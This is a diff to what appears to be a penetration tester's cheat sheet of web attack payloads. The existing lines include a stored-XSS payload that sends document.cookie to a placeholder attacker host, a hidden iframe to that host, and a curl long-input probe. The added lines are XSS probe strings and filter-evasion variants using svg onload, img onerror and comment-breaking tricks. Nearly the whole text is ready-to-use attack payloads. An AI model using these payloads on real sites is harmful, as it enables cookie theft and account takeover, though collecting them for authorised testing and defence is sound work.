@@ -163,7 +163,17 @@ Ampersand            &foo
 
 Stored - example: guestbook
 <script>alert("XSS");</script>
+<ScRiPt>alert(1)</ScRiPt>
 <iframe SRC="http://attackerIP" height="0" width="0"></iframe>
 <script>new Image().src="http://attakerIP/test.php?output="+document.cookie;</script>
 
 curl http://target.com/login.php?user=`perl –e 'print "a" x 500'`
+
+test xss probe string '';!--"<XSS>=&{()}   #testing to see whats available when testing for xss 
+
+onmouseover=alert(document.cookie)
+<img src="/" ()_()" title="onerror='prompt(1)'">
+<svg/onload=alert(1)
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> 
+
